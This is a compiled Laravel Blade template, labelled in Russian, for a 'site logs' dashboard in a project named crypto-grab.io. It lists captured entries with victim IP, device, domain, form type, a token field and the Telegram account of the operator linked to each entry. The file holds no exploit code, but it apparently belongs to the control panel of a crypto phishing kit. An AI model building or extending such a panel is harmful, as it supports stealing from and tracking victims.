<?php $__env->startSection('title', 'Логи сайтов'); ?>

<?php $__env->startSection('header'); ?>

<?php $__env->stopSection(); ?>

<?php $__env->startSection('content'); ?>
    <?php if($projectLogUser): ?>
        <?php $__currentLoopData = $projectLogUser; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $item): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
            <?php $__env->startPush('modal_full_view_project_logs'); ?>
                <div class="modal_window" id="modal_full_view_project_logs-<?php echo e($item->id); ?>">
                    <button class="close mx_button_act-openmodalwindow"
                            target_modal_id="modal_full_view_project_logs-<?php echo e($item->id); ?>">x
                    </button>
                    <h4 class="ttl">Демо проект №<?php echo e($item->id); ?></h4>
                    <div class="flex" style="display: flex">
                        <div class="def_form" style="width: 40%;height: 430px;overflow-y: scroll;">
                            <?php if($item->country_img): ?>
                                        <img style="width: 100%;" loading="lazy" class="img" src="<?php echo e($item->country_img); ?>"/>
                            <?php endif; ?>
                            <?php if($item->country): ?>
                                <p class="txt">Страна: <?php echo e($item->country); ?></p>
                            <?php endif; ?>
                            <p class="txt">IP: <?php echo e($item->user_ip); ?></p>
                            <p class="txt">Девайс: <?php echo e($item->user_agent); ?></p>
                            <p class="txt">Домен: <?php echo e($item->domain); ?></p>
                            <p class="txt">Тип: <?php echo e($item->form_name); ?></p>
                            <p class="txt">Токен: <?php echo e($item->token); ?></p>
                            <p class="txt">Кол-во вводов с
                                IP: <?php echo e($item->getLogsIpCount($item->user_ip)->count()); ?></p>
                            <?php if (app(\Illuminate\Contracts\Auth\Access\Gate::class)->check('view_all_logs')): ?>
                                <p class="txt">
                                    Аккаунт: <a href="<?php echo e(route('user_data.show', $item->getUserLog($item->telegram_id)->id)); ?>"><?php echo e('@'.$item->getUserLog($item->telegram_id)->name_telegram); ?></a>
                                </p>
                            <?php endif; ?>
                            <p class="txt">Лог: <?php echo e($item->main_dates); ?></p>
                        </div>
                        <div class="def_form" style="width: 60%;height: 430px;padding:15px;overflow-y: scroll;">
                            <?php $datalog = $item->getLogsIpCount($item->user_ip)->reverse();
                                                     $cloak = [0,];
                            ?>
                            <?php $__currentLoopData = $datalog; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $itemDataLog): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                                <?php if(!in_array($itemDataLog->created_at->format('j'), $cloak)): ?>
                                    <h4><?php echo e($itemDataLog->created_at->format('j.m.Y')); ?></h4>
                                    <?php $__currentLoopData = $datalog; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $dataItem): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                                        <ul>
                                            <?php if($dataItem->created_at->format('j') == $itemDataLog->created_at->format('j')): ?>
                                                <li>
                                                    <p class="txt"><?php echo e($dataItem->domain); ?> - <?php echo e($dataItem->created_at->format('G:i:s')); ?></p>
                                                </li>
                                            <?php endif; ?>
                                        </ul>
                                    <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
                                    <?php array_push($cloak, $itemDataLog->created_at->format('j')); ?>
                                <?php endif; ?>
                            <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
                        </div>
                    </div>
                </div>
            <?php $__env->stopPush(); ?>
        <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
    <?php endif; ?>
    <main class="dashboard_content dashboard_content-norightsidebar">
        <div class="mx_title">
            <h2 class="ttl">Логи</h2>
            <p class="desc">Информация о полученных данных</p>
        </div>
        <div class="dash_list dash_list-logsinfo">
            <div class="row row-title">
                <div class="cell">
                    №
                </div>
                <?php if (app(\Illuminate\Contracts\Auth\Access\Gate::class)->check('view_all_logs')): ?>
                    <div class="cell">
                        логин Tg
                    </div>
                <?php endif; ?>
                <div class="cell">
                    IP
                </div>
                <div class="cell">
                    девайс
                </div>
                <div class="cell">
                    Домен
                </div>
                <div class="cell">
                    Кол-во вводов с IP
                </div>
                <div class="cell">
                    Время
                </div>
                <div class="cell">
                    
                </div>
            </div>
            <?php if($projectLogUser): ?>
                <?php $__currentLoopData = $projectLogUser; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $item): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
                    <div class="row">
                        <div class="cell">
                            <?php echo e($item->id); ?>

                        </div>
                        <?php if (app(\Illuminate\Contracts\Auth\Access\Gate::class)->check('view_all_logs')): ?>
                        <div class="cell">
                                <a href="<?php echo e(route('user_data.show', $item->getUserLog($item->telegram_id)->id)); ?>"><?php echo e('@'.$item->getUserLog($item->telegram_id)->name_telegram); ?></a>
                        </div>
                        <?php endif; ?>
                        <div class="cell">
                            <?php if($item->country_img): ?>
                                <img
                                    style="max-width: 13px;" src="<?php echo e($item->country_img); ?>"
                                    data-toggle="tooltip" data-placement="left"
                                    title="<?php echo e($item->country); ?>"/>
                            <?php else: ?>
                                -
                            <?php endif; ?>
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                            
                        </div>
                        <div class="cell">
                            <?php if(strripos($item->user_agent, 'chrome') !== false): ?>
                                <img
                                    style="max-width: 20px;"
                                    src="<?php echo e(asset('browser_img/chrome.png')); ?>"
                                    data-toggle="tooltip" data-placement="left"
                                    title="Chrome"/>
                            <?php elseif(strripos($item->user_agent, 'opera') !== false): ?>
                                <img
                                    style="max-width: 20px;"
                                    src="<?php echo e(asset('browser_img/opera.png')); ?>"
                                    data-toggle="tooltip" data-placement="left"
                                    title="Opera"/>
                            <?php endif; ?>
                            <?php if(strripos($item->user_agent, 'windows') !== false): ?>
                                <img
                                    style="max-width: 20px;"
                                    src="<?php echo e(asset('device_img/windows.png')); ?>"
                                    data-toggle="tooltip" data-placement="left"
                                    title="windows"/>
                            <?php elseif(strripos($item->user_agent, 'linux') !== false): ?>
                                <img
                                    style="max-width: 20px;"
                                    src="<?php echo e(asset('device_img/linux.png')); ?>"
                                    data-toggle="tooltip" data-placement="left"
                                    title="linux"/>
                            <?php elseif(strripos($item->user_agent, 'apple') !== false): ?>
                                <img
                                    style="max-width: 20px;"
                                    src="<?php echo e(asset('device_img/ios.png')); ?>"
                                    data-toggle="tooltip" data-placement="left"
                                    title="IOS"/>
                            <?php elseif(strripos($item->user_agent, 'android') !== false): ?>
                                <img
                                    style="max-width: 20px;"
                                    src="<?php echo e(asset('device_img/android.png')); ?>"
                                    data-toggle="tooltip" data-placement="left"
                                    title="android"/>
                            <?php endif; ?>
                        </div>
                        <div class="cell">
                            <?php echo e($item->domain); ?>

                        </div>
                        <div class="cell">
                            <?php echo e($item->getLogsIpCount($item->user_ip)->count()); ?>

                        </div>
                        <div class="cell">
                            <?php echo e($item->created_at->format('G:i:s j.m.Y')); ?>

                        </div>
                        <div class="cell">
                            <button class="btn purple mx_button mx_button_act-openmodalwindow"
                                    target_modal_id="modal_full_view_project_logs-<?php echo e($item->id); ?>">
                                <svg xmlns="http://www.w3.org/2000/svg" width="19" height="18" viewBox="0 0 19 18">
                                    <path
                                        d="M16.6042 6.86251C14.8717 4.14001 12.3367 2.57251 9.66675 2.57251C8.33175 2.57251 7.03425 2.96251 5.84925 3.69001C4.66425 4.42501 3.59925 5.49751 2.72925 6.86251C1.97925 8.04001 1.97925 9.95251 2.72925 11.13C4.46175 13.86 6.99675 15.42 9.66675 15.42C11.0017 15.42 12.2992 15.03 13.4842 14.3025C14.6692 13.5675 15.7342 12.495 16.6042 11.13C17.3542 9.96001 17.3542 8.04001 16.6042 6.86251ZM9.66675 12.03C7.98675 12.03 6.63675 10.6725 6.63675 9.00001C6.63675 7.32751 7.98675 5.97001 9.66675 5.97001C11.3467 5.97001 12.6967 7.32751 12.6967 9.00001C12.6967 10.6725 11.3467 12.03 9.66675 12.03Z"
                                        fill="white"/>
                                    <path
                                        d="M9.66674 6.85498C8.48924 6.85498 7.52924 7.81498 7.52924 8.99998C7.52924 10.1775 8.48924 11.1375 9.66674 11.1375C10.8442 11.1375 11.8117 10.1775 11.8117 8.99998C11.8117 7.82248 10.8442 6.85498 9.66674 6.85498Z"
                                        fill="white"/>
                                </svg>
                            </button>
                        </div>
                    </div>
                <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
            <?php endif; ?>
        </div>
        <?php echo e($projectLogUser->links()); ?>

    </main>

<?php $__env->stopSection(); ?>
<?php $__env->startSection('footer'); ?>

<?php $__env->stopSection(); ?>

<?php echo $__env->make('template.app', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH /home/a0577192/domains/crypto-grab.io/resources/views/project_logs/index.blade.php ENDPATH**/ ?>